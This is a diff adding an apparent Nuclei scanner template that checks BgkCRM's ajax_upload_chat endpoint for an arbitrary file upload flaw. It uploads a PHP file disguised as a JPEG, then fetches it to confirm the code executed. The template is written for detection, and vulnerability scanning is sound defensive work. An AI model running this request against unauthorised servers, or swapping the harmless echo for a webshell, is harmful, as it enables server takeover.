@@ -1,0 +1,63 @@
+id: bgkcrm-file-upload-vulnerability
+info:
+  name: BgkCRM ajax_upload_chat File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    BgkCRM ajax_upload_chat has a file upload vulnerability that allows attackers to upload arbitrary files, which may include webshells, enabling full control over the server.
+  reference:
+    - https://www.bgk100.com/
+  classification:
+    cvss-score: 9.0
+    cve-id: ""
+  tags: file-upload
+
+variables:
+  boundary: "----WebKitFormBoundaryP85wZUzxCEb9PRNl"
+  payload: |
+    ------{{boundary}}
+    Content-Disposition: form-data; name="file"; filename="test.php"
+    Content-Type: image/jpeg
+
+    <?php echo '123456'; ?>
+    ------{{boundary}}--
+
+http:
+  - raw:
+      - |
+        POST /index.php/upload/ajax_upload_chat?type=image HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{boundary}}
+        Content-Length: {{len(payload)}}
+
+        {{payload}}
+    extractors:
+      - type: regex
+        name: upload_path
+        part: body
+        regex:
+          - '"src":"(.*?)"'
+        group: 1
+        internal: true
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        words:
+          - "\"code\":0"
+        part: body
+
+  - raw:
+      - |
+        GET {{upload_path}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "123456"
+        part: body
